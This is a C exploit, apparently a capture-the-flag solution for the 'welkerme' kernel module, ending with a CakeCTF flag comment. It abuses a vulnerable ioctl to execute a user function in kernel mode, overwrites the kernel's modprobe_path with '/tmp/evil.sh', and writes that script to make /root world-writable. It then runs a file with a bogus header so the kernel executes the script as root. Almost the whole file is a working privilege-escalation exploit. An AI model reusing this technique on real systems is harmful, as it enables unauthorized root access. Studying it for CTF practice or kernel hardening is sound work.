#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define CMD_ECHO 0xc0de0001
#define CMD_EXEC 0xc0de0002

unsigned long modprobe_path = 0xffffffff81e37fa0;

int func(void) {
  char cmd[] = "/tmp/evil.sh";
  memcpy((void *)modprobe_path, cmd, strlen(cmd)+1);
}

int main(void) {
  int fd, ret;

  if ((fd = open("/dev/welkerme", O_RDWR)) < 0) {
    perror("/dev/welkerme");
    exit(1);
  }

  ret = ioctl(fd, CMD_ECHO, 12345);
  printf("CMD_ECHO(12345) --> %d\n", ret);

  ret = ioctl(fd, CMD_EXEC, (long)func);
  printf("CMD_EXEC(func) --> %d\n", ret);

  close(fd);

  system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/evil.sh");
  system("chmod +x /tmp/evil.sh");
  system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
  system("chmod +x /tmp/pwn");
  system("/tmp/pwn");

  return 0;
}

// CakeCTF{b4s1cs_0f_pr1v1l3g3_3sc4l4t10n!!}
